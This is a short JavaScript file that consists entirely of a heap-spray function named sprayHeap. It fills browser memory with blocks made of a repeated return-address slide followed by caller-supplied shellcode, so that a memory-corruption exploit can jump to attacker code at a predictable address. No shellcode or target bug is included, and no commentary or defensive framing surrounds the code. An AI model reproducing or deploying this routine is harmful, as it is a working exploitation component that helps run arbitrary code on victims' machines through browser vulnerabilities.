var memory = new Array();
function sprayHeap(shellcode, heapSprayAddr, heapBlockSize) {
  var index;
  var heapSprayAddr_hi = (heapSprayAddr >> 16).toString(16);
  var heapSprayAddr_lo = (heapSprayAddr & 0xffff).toString(16);
  while (heapSprayAddr_hi.length < 4) { heapSprayAddr_hi = "0" + heapSprayAddr_hi; }
  while (heapSprayAddr_lo.length < 4) { heapSprayAddr_lo = "0" + heapSprayAddr_lo; }

  var retSlide = unescape("%u"+heapSprayAddr_hi + "%u"+heapSprayAddr_lo);
  while (retSlide.length < heapBlockSize) { retSlide += retSlide; }
  retSlide = retSlide.substring(0, heapBlockSize - shellcode.length);

  var heapBlockCnt = (heapSprayAddr - heapBlockSize)/heapBlockSize;
  for (index = 0; index < heapBlockCnt; index++) {
    memory[index] = retSlide + shellcode;
  }
}